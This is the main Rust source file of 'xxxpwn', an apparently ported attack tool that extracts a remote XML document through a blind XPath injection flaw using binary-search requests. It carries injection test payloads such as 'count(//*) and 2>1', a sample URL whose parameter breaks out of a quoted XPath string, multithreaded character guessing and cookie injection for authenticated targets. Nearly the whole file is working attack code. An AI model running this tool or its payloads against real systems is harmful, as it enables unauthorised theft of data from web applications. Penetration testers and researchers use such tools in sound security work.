mod attack;
mod bst;
mod context;
mod xml;

use std::collections::HashSet;
use std::fs;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Instant;

use clap::Parser;
use crossbeam_channel::unbounded;

use attack::{attack, encode_payload};
use context::{AttackCtx, CharJob, CharResult, Config, XmlState, DEFAULT_CHARSET, ROOT_NODE};
use xml::{get_xml_bst, get_xml_details, xml_optimize_character_set, xml_search};

#[derive(Parser, Debug)]
#[command(
    name = "xxxpwn",
    version = "1.0 kiwicon release",
    about = "Read a remote XML file through an XPath injection vulnerability using optimized BST requests"
)]
struct Args {
    /// Perform case-sensitive string matches (default=insensitive)
    #[arg(short = 'c', long = "case")]
    case_sensitive: bool,

    /// URL encode key characters in payload
    #[arg(short = 'U', long = "urlencode")]
    urlencode: bool,

    /// HTML encode key characters in payload
    #[arg(short = 'H', long = "htmlencode")]
    htmlencode: bool,

    /// Use SSL for connection
    #[arg(short = 's', long = "ssl")]
    use_ssl: bool,

    /// File containing sample request with $INJECT as dynamic injection location
    /// (required unless --url is given)
    #[arg(short = 'i', long = "inject")]
    inject_file: Option<String>,

    /// Keyword that is present on a successful injection response
    #[arg(short = 'm', long = "match", required = true)]
    match_pattern: String,

    /// Target host (required unless --url is given)
    host: Option<String>,

    /// Target port (required unless --url is given)
    port: Option<u16>,

    /// Full URL with $INJECT in the parameter to attack.
    /// Host, port, SSL, and the request template are all derived automatically.
    /// Example: "http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search"
    #[arg(long = "url", conflicts_with_all = ["inject_file", "host", "port", "use_ssl"])]
    url: Option<String>,

    // --- Test options ---
    /// Test injection with a single example payload and show full request/response
    #[arg(short = 'e', long = "example")]
    example: Option<String>,

    /// Print XML summary information only (no content retrieval)
    #[arg(long = "summary")]
    summary: bool,

    /// Disable accessing comments/instructions in root
    #[arg(long = "no_root")]
    no_root: bool,

    /// Disable accessing comments in retrieval
    #[arg(long = "no_comments")]
    no_comments: bool,

    /// Disable accessing processing-instruction nodes
    #[arg(long = "no_processor")]
    no_processor: bool,

    /// Disable accessing attributes
    #[arg(long = "no_attributes")]
    no_attributes: bool,

    /// Disable accessing attribute values
    #[arg(long = "no_values")]
    no_values: bool,

    /// Disable accessing text nodes
    #[arg(long = "no_text")]
    no_text: bool,

    /// Disable accessing child nodes
    #[arg(long = "no_child")]
    no_child: bool,

    // --- Advanced options ---
    /// Reduce injection to lowercase-only matches (optimize for lowercase targets)
    #[arg(short = 'l', long = "lowercase")]
    use_lowercase: bool,

    /// Maintain global count of all nodes before retrieval
    #[arg(short = 'g', long = "global_count")]
    global_count: bool,

    /// Normalize whitespace in node values
    #[arg(short = 'n', long = "normalize_space")]
    normalize_space: bool,

    /// Optimize character set globally and per-string when length exceeds 30
    #[arg(short = 'o', long = "optimize_charset")]
    optimize_charset: bool,

    /// Match current nodes against previously recovered names to save requests
    #[arg(short = 'x', long = "xml_match")]
    xml_match: bool,

    /// Low bound for string-length BST
    #[arg(long = "len_low", default_value_t = 0)]
    len_low: i64,

    /// Starting high bound for string-length BST
    #[arg(long = "len_high", default_value_t = 16)]
    len_high: i64,

    /// Start recovery at this XPath node
    #[arg(long = "start_node", default_value = ROOT_NODE)]
    start_node: String,

    /// Character set string for BST character discovery
    #[arg(short = 'u', long = "use_characters")]
    character_set: Option<String>,

    /// Add extended Latin Unicode characters to the search space
    #[arg(long = "unicode")]
    unicode: bool,

    /// Parallelize character discovery with N threads (0 = disabled)
    #[arg(short = 't', long = "threads", default_value_t = 0)]
    threads: usize,

    /// Check whether target supports XPath 2.0 (lower-case() function)
    #[arg(long = "xpath2")]
    xpath2: bool,

    /// Search all node types for the given string
    #[arg(long = "search")]
    search: Option<String>,

    /// Match search string at start of node only (starts-with instead of contains)
    #[arg(long = "search_start")]
    search_start: bool,

    /// File containing cookies to inject (one name=value per line, # for comments)
    #[arg(short = 'C', long = "cookies")]
    cookie_file: Option<String>,
}

fn main() {
    let t1 = Instant::now();
    let args = Args::parse();

    // Build inject_content, host, port, and ssl from either --url or --inject + positional args
    let (inject_content, host, port, use_ssl) = if let Some(ref raw_url) = args.url {
        match build_from_url(raw_url) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("Error: Could not parse --url: {}", e);
                std::process::exit(2);
            }
        }
    } else {
        // Require --inject, host, port in traditional mode
        let inject_file = match args.inject_file.as_deref() {
            Some(f) => f,
            None => {
                eprintln!("Error: either --url or --inject + host + port are required");
                std::process::exit(2);
            }
        };
        let content = match fs::read_to_string(inject_file) {
            Ok(c) => c,
            Err(e) => {
                eprintln!("Error: Cannot access injection file: {}", e);
                std::process::exit(2);
            }
        };
        let host = match args.host.clone() {
            Some(h) => h,
            None => {
                eprintln!("Error: host is required when not using --url");
                std::process::exit(2);
            }
        };
        let port = match args.port {
            Some(p) => p,
            None => {
                eprintln!("Error: port is required when not using --url");
                std::process::exit(2);
            }
        };
        (content, host, port, args.use_ssl)
    };

    // Verify $INJECT placeholder is present
    let ci = if args.case_sensitive { "" } else { "(?i)" };
    let inject_check = regex::Regex::new(&format!(r"{}\$INJECT", ci)).unwrap();
    if !inject_check.is_match(&inject_content) {
        eprintln!(
            "### Error: Could not find '$INJECT' string in provided content: ###\n{}",
            inject_content
        );
        std::process::exit(4);
    }

    if args.len_low >= args.len_high {
        eprintln!(
            "### Invalid character length matching parameters. Must be set as {} < {} ###",
            args.len_low, args.len_high
        );
        std::process::exit(5);
    }

    // Build and deduplicate the character set
    let mut character_set: String = args
        .character_set
        .clone()
        .unwrap_or_else(|| DEFAULT_CHARSET.to_string());

    if args.use_lowercase {
        character_set = character_set
            .chars()
            .filter(|c| !c.is_ascii_uppercase())
            .collect();
    }

    if args.unicode {
        let unicode_str =
            "ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ";
        eprintln!(
            "### Adding {} Unicode characters to character set of length {} ###",
            unicode_str.chars().count(),
            character_set.len()
        );
        character_set.push_str(unicode_str);
    }

    // Deduplicate
    let seen: HashSet<char> = character_set.chars().collect();
    character_set = seen.into_iter().collect();

    // Parse cookie file if provided
    let cookies = if let Some(ref path) = args.cookie_file {
        match fs::read_to_string(path) {
            Ok(content) => {
                let cookie_str: String = content
                    .lines()
                    .map(str::trim)
                    .filter(|l| !l.is_empty() && !l.starts_with('#'))
                    .collect::<Vec<_>>()
                    .join("; ");
                if cookie_str.is_empty() {
                    None
                } else {
                    Some(cookie_str)
                }
            }
            Err(e) => {
                eprintln!("Error: Cannot read cookie file '{}': {}", path, e);
                std::process::exit(2);
            }
        }
    } else {
        None
    };

    let config = Config {
        case_sensitive: args.case_sensitive,
        urlencode: args.urlencode,
        htmlencode: args.htmlencode,
        use_ssl,
        inject_content,
        match_pattern: args.match_pattern.clone(),
        host,
        port,
        verbose_attack: args.example.is_some(),
        summary: args.summary,
        no_root: args.no_root,
        no_comments: args.no_comments,
        no_processor: args.no_processor,
        no_attributes: args.no_attributes,
        no_values: args.no_values,
        no_text: args.no_text,
        no_child: args.no_child,
        use_lowercase: args.use_lowercase,
        global_count: args.global_count,
        normalize_space: args.normalize_space,
        optimize_charset: args.optimize_charset,
        xml_match: args.xml_match,
        len_low: args.len_low,
        len_high: args.len_high,
        start_node: args.start_node.clone(),
        character_set: character_set.clone(),
        threads: args.threads,
        xpath2: args.xpath2,
        search: args.search.clone(),
        search_start: args.search_start,
        cookies,
    };

    // Set up worker thread channels
    let (job_tx, job_rx) = unbounded::<CharJob>();
    let (res_tx, res_rx) = unbounded::<CharResult>();

    let ctx = Arc::new(AttackCtx {
        config,
        request_count: AtomicU64::new(0),
        thread_tx: if args.threads > 0 { Some(job_tx) } else { None },
        result_rx: if args.threads > 0 { Some(res_rx) } else { None },
    });

    // Spawn worker threads
    let mut thread_handles = Vec::new();
    for _ in 0..args.threads {
        let ctx_clone = Arc::clone(&ctx);
        let job_rx_clone = job_rx.clone();
        let res_tx_clone = res_tx.clone();
        let handle = thread::spawn(move || {
            while let Ok(job) = job_rx_clone.recv() {
                let ch = bst::get_character_bst(&job.node, job.position, &job.chars, &ctx_clone);
                let _ = res_tx_clone.send(CharResult {
                    position: job.position,
                    ch,
                });
            }
        });
        thread_handles.push(handle);
    }

    // --- Example test mode ---
    if let Some(ref example) = args.example {
        println!("### Testing {} ###", example);
        let example_ctx = Arc::new(AttackCtx {
            config: Config {
                no_child: true,
                verbose_attack: true,
                ..ctx.config.clone()
            },
            request_count: AtomicU64::new(0),
            thread_tx: None,
            result_rx: None,
        });
        attack(&encode_payload(example, &example_ctx.config), &example_ctx);
        std::process::exit(0);
    }

    // --- Validate injection point ---
    if !attack(&encode_payload("count(//*) and 2>1", &ctx.config), &ctx) {
        eprintln!(
            "### Test Injection Failed to match '{}' using: ###\n{}\n",
            args.match_pattern, ctx.config.inject_content
        );
        eprintln!("### If you know injection location is correct, please examine use of -U and -H flags ###");
        std::process::exit(6);
    }
    if attack(&encode_payload("0>1", &ctx.config), &ctx) {
        eprintln!(
            "### Matched '{}' using invalid XPath request on: ###\n{}\n",
            args.match_pattern, ctx.config.inject_content
        );
        eprintln!("### If you know injection location is correct, please examine use of -U and -H flags ###");
        std::process::exit(7);
    }

    // --- XPath 2.0 check ---
    if args.xpath2 {
        if attack(&encode_payload("lower-case('A')='a'", &ctx.config), &ctx) {
            eprintln!(
                "### Looks like {}:{} supports XPath 2.0 injection via lower-case(), consider using xcat ###",
                ctx.config.host, ctx.config.port
            );
            std::process::exit(8);
        }
    }

    // --- Global charset optimisation (after basic validation) ---
    if args.optimize_charset {
        let optimized = xml_optimize_character_set(&ctx.config.character_set.clone(), &ctx);
        // Rebuild ctx with the optimized charset + fresh channels and worker threads.
        // Cloning config before dropping ctx avoids borrow-after-move.
        let new_config = Config {
            character_set: optimized,
            ..ctx.config.clone()
        };
        // Drop old ctx: this drops job_tx, closing the channel so workers exit cleanly.
        drop(thread_handles);
        drop(ctx);

        let (job_tx2, job_rx2) = unbounded::<CharJob>();
        let (res_tx2, res_rx2) = unbounded::<CharResult>();
        let ctx = Arc::new(AttackCtx {
            config: new_config,
            request_count: AtomicU64::new(0),
            thread_tx: if args.threads > 0 { Some(job_tx2) } else { None },
            result_rx: if args.threads > 0 { Some(res_rx2) } else { None },
        });
        for _ in 0..args.threads {
            let ctx_clone = Arc::clone(&ctx);
            let job_rx_clone = job_rx2.clone();
            let res_tx_clone = res_tx2.clone();
            thread::spawn(move || {
                while let Ok(job) = job_rx_clone.recv() {
                    let ch = bst::get_character_bst(&job.node, job.position, &job.chars, &ctx_clone);
                    let _ = res_tx_clone.send(CharResult { position: job.position, ch });
                }
            });
        }
        run_attack(ctx, &args, t1);
        return;
    }

    run_attack(ctx, &args, t1);
}

fn run_attack(ctx: Arc<AttackCtx>, args: &Args, t1: Instant) {
    // --search exits before any XML retrieval, matching Python behaviour
    if let Some(ref search) = args.search {
        println!("### Searching globally for {} ###", search);
        xml_search(search, &ctx);
        print_stats(&ctx, t1);
        return;
    }

    if !args.summary {
        println!("\n### Raw XML ####:");
    }

    let mut state = XmlState::default();
    let mut xml_content = get_xml_details(&ctx, &mut state);

    if !args.summary {
        xml_content.push_str(&get_xml_bst(&ctx.config.start_node, &ctx, &mut state));

        println!("\n\n### Parsed XML ####:");
        match parse_and_pretty(&xml_content) {
            Ok(pretty) => println!("{}", pretty),
            Err(e) => {
                eprintln!(
                    "### Unable to process as complete XML document '{}', re-printing raw XML ###",
                    e
                );
                println!("{}", xml_content);
            }
        }

        if args.global_count {
            println!(
                "### XML Elements Remaining: Nodes: {}, Attributes: {}, Comments: {}, Instructions: {}, Text: {} ###",
                state.nodes_total,
                state.attributes_total,
                state.comments_total,
                state.instructions_total,
                state.text_total
            );
        }
    }

    print_stats(&ctx, t1);
}

fn print_stats(ctx: &Arc<AttackCtx>, t1: Instant) {
    let elapsed = t1.elapsed().as_secs_f64();
    let count = ctx.request_count.load(Ordering::Relaxed);
    eprintln!(
        "### {} requests made in {:.2} seconds ({:.2} req/sec) ###",
        count,
        elapsed,
        count as f64 / elapsed
    );
}

/// Parse a URL containing $INJECT and return (inject_content, host, port, use_ssl).
///
/// The URL must contain `$INJECT` somewhere in the query string (or path).
/// SSL is inferred from the scheme. Port defaults to 80/443 per scheme.
///
/// Example:
///   `http://wheels/portal.php?work=car'+or+$INJECT+and+'1'='1&action=search`
fn build_from_url(raw: &str) -> Result<(String, String, u16, bool), String> {
    use ::url::Url;

    let parsed = Url::parse(raw).map_err(|e| format!("invalid URL: {}", e))?;

    let scheme = parsed.scheme();
    let use_ssl = match scheme {
        "https" => true,
        "http" => false,
        other => return Err(format!("unsupported scheme '{}', use http or https", other)),
    };

    let host = parsed
        .host_str()
        .ok_or("URL has no host")?
        .to_string();

    let port = parsed
        .port_or_known_default()
        .ok_or("could not determine port from URL")?;

    // Reconstruct path + query, preserving $INJECT verbatim.
    // Url::parse percent-encodes $INJECT, so we work on the raw string instead.
    let after_authority = raw
        .find(&format!("{}:{}", scheme, "//"))
        .map(|_| {
            // skip "scheme://"
            let rest = &raw[scheme.len() + 3..];
            // skip the authority (host:port)
            rest.find('/').map(|p| &rest[p..]).unwrap_or("/")
        })
        .unwrap_or("/");

    let request = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\n\r\n",
        after_authority, host
    );

    Ok((request, host, port, use_ssl))
}

/// Minimal XML pretty-printer using Rust's standard library XML parser.
fn parse_and_pretty(xml: &str) -> Result<String, String> {
    // Use a simple indentation approach since std has no XML pretty-printer.
    // We reformat by inserting newlines/indentation around tags.
    let mut output = String::new();
    let mut depth: usize = 0;
    let mut i = 0;
    let bytes = xml.as_bytes();

    while i < bytes.len() {
        if bytes[i] == b'<' {
            let end = xml[i..].find('>').map(|p| i + p + 1).unwrap_or(xml.len());
            let tag = &xml[i..end];

            if tag.starts_with("</") {
                depth = depth.saturating_sub(1);
                output.push('\n');
                output.push_str(&"  ".repeat(depth));
                output.push_str(tag);
            } else if tag.ends_with("/>") || tag.starts_with("<!--") || tag.starts_with("<?") {
                output.push('\n');
                output.push_str(&"  ".repeat(depth));
                output.push_str(tag);
            } else {
                output.push('\n');
                output.push_str(&"  ".repeat(depth));
                output.push_str(tag);
                depth += 1;
            }
            i = end;
        } else {
            // Text content — collect until next '<'
            let end = xml[i..].find('<').map(|p| i + p).unwrap_or(xml.len());
            let text = xml[i..end].trim();
            if !text.is_empty() {
                output.push('\n');
                output.push_str(&"  ".repeat(depth));
                output.push_str(text);
            }
            i = end;
        }
    }

    if output.is_empty() {
        Err("empty document".to_string())
    } else {
        Ok(output.trim_start_matches('\n').to_string())
    }
}
